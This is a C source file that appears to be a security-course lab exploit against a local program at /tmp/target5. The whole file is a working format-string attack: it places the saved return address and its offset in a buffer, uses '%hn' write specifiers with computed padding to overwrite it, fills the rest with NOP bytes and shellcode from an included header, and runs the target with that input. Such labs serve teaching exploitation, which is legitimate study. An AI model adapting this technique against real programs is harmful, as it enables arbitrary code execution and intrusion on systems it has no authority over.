#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
	// We're little endian, so this is in reverse.
	// EIP: 0xbffffe20.
	char EIP_ADDRESS[] = "\x20\xfe\xff\xbf";
	char OFFSET_EIP_ADDRESS[] = "\x22\xfe\xff\xbf";

	// We need to write a particular number of characters to our string in order
	// to write the right value to our address.
	// We want to pass control to address is 0xbfffffc1 (our shellcode).
	// We always read $1 for padding, and we force $1 and $2 for locations to
	// write.
	// For 0xbfff we need 49151 bytes, (-8) = 49143.
	// For 0xffc1 we need 65473 nytes, (-49151) = 16322
	char TOP_ORDER_BYTES_EXPLOIT[] = "%1$49143x%2$hn";
	char LOW_ORDER_BYTES_EXPLOIT[] = "%1$16322x%1$hn";

	char sploitstring[400];
	memset(sploitstring, '\x90', sizeof(sploitstring));
	char* curr = sploitstring;

	// 1$ is our memory address.
	// 2$ is our second memory address (offset by 2), since we write 2 bytes at a
	// time.
	// All other arguments should never be accessed.
	memcpy(curr, EIP_ADDRESS, sizeof(EIP_ADDRESS) - 1);
	curr += sizeof(EIP_ADDRESS) - 1;
	memcpy(curr, OFFSET_EIP_ADDRESS, sizeof(OFFSET_EIP_ADDRESS) - 1);
	curr += sizeof(OFFSET_EIP_ADDRESS) - 1;
	memcpy(curr, TOP_ORDER_BYTES_EXPLOIT, sizeof(TOP_ORDER_BYTES_EXPLOIT) - 1);
	curr += sizeof(TOP_ORDER_BYTES_EXPLOIT) - 1;
	memcpy(curr, LOW_ORDER_BYTES_EXPLOIT, sizeof(LOW_ORDER_BYTES_EXPLOIT) - 1);
	curr += sizeof(LOW_ORDER_BYTES_EXPLOIT) - 1;

	// We now copy the shellcode. The only requirement is that the low order
	// bytes are larger than the top order bytes in buffer.
	memcpy(curr, shellcode, sizeof(shellcode));

	char *args[] = { TARGET, sploitstring, NULL };
	char *env[] = { NULL };

	execve(TARGET, args, env);
	fprintf(stderr, "execve failed.\n");

	return 0;
}
